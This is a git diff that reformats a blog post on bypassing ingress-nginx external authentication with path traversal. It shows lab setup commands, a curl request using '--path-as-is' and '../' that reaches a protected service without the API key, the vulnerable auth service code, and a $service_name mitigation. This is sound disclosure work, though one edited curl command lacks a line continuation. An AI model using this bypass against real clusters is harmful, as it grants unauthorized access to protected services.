@@ -3,6 +3,7 @@ title: "External Authentication bypass in ingress-nginx"
 date: 2022-05-29T16:59:02+01:00
 draft: false
 tags: [kubernetes, ingress, nginx, path-traversal]
+description: "In October 2021 I was researched ingress-nginx for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of $request_uri which leaded to Apache APISIX CVE-2021-43557."
 ---
 
 {{< figure src="https://user-images.githubusercontent.com/17719543/170878532-514c01cc-aa97-42b2-adba-f61a155d9863.png" class="image-center" >}}
@@ -34,7 +35,7 @@ For me it's not enough. There should be brought documentation of risks associate
 * [GHSA-xcx5-93pw-jw2w](https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w) (CVE-2019–9901) - description of risks associated with normalizing paths in envoy
 * [envoy http connection manager options](https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto) - look for two particular: `normalize_path` and `path_with_escaped_slashes_action`
 
-**If you also thinks similar. Put your comment in https://github.com/kubernetes/ingress-nginx/issues/8644**
+**If you thinks similar. Put your comment in https://github.com/kubernetes/ingress-nginx/issues/8644**
 
 ## Setting the stage
 
@@ -50,28 +51,30 @@ In case of problems follow [official guide](https://kubernetes.github.io/ingress
 
 ### deploy test application
 
-```
-kubectl apply -f https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
+```bash
+kubectl apply -f \
+  https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
 ```
 
 ### [optional] forward ingress port
 
-```
-kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80
+```bash
+kubectl port-forward service/ingress-nginx-controller \ 
+  -n ingress-nginx 8080:80
 ```
 
 ### verify services
 
 First public service. It should be available without authentication:
 
-```
+```bash
 $ curl http://127.0.0.1:8080/public-service/public -H "Host: app.test"
 {"data":"public data"}
 ```
 
 and now protected:
 
-```
+```bash
 $ curl http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"
 <html>
 <head><title>401 Authorization Required</title></head>
@@ -81,7 +84,8 @@ $ curl http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"
 </body>
 </html>
 
-$ curl http://127.0.0.1:8080/protected-service/protected -H "X-Api-Key: secret-api-key" -H "Host: app.test"
+$ curl http://127.0.0.1:8080/protected-service/protected \
+  -H "X-Api-Key: secret-api-key" -H "Host: app.test"
 {"data":"protected data"}
 ```
 
@@ -91,8 +95,10 @@ as you can see I need to provide "secret-api-key" to get resource.
 
 Let's send request with path traversal
 
-```
-$ curl --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected -H "Host: app.test"
+```bash
+$ curl \
+  --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected 
+  -H "Host: app.test"
 {"data":"protected data"}
 ```
 
@@ -102,7 +108,7 @@ As you can see, I was able to bypass uri restrictions 😄
 
 Of course **not all** authentication services will be vulnerable. Only those that are making specific decisions based on requested paths. In my case service looks like this:
 
-```
+```python
 @app.route('/verify')
 def verify():
     print(request.headers, file=sys.stderr)
@@ -120,7 +126,7 @@ def verify():
 
 and ingress is defined as:
 
-```
+```yaml
 apiVersion: networking.k8s.io/v1
 kind: Ingress
 metadata:
@@ -154,7 +160,7 @@ spec:
 
 One thing is to not trust content of `X-Original-Uri` and `X-Auth-Request-Redirect` headers. But there is also nice variable that can be used: `$service_name`
 
-```
+```yaml
 apiVersion: networking.k8s.io/v1
 kind: Ingress
 metadata:
@@ -169,7 +175,7 @@ metadata:
       more_set_input_headers "X-Forwarded-Host: $http_host";
 ```
 
-it allows to get name of service in kubernetes that is targeted by request and pass it to auth-url. This way it's not manipulated!
+it allows to get name of service in kubernetes that is targeted by request and pass it to `auth-url`. This way it's not manipulated!
 
 ## Summary
 
